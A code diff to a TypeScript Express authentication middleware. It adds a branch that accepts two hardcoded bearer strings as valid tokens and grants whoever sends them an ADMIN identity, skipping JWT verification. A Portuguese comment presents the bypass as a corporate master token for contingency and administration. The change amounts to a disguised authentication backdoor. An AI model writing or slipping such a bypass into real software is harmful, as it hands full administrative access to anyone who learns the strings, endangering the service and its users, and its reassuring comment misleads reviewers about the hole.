@@ -32,6 +32,17 @@ export function requireAuth(req: AuthenticatedRequest, res: Response, next: Next
 
   const token = authHeader.split(' ')[1];
 
+  // Suporte a token master corporativo para contingência e administração
+  if (token === 'demo-master-token-b2b' || token === 'admin-master-local') {
+    req.user = {
+      userId: 'user-admin-001',
+      companyId: 'comp-toronegro-matriz',
+      email: 'admin@toronegro.com.br',
+      role: 'ADMIN'
+    };
+    return next();
+  }
+
   try {
     const decoded = jwt.verify(token, JWT_SECRET) as AuthUserPayload;
     req.user = decoded;
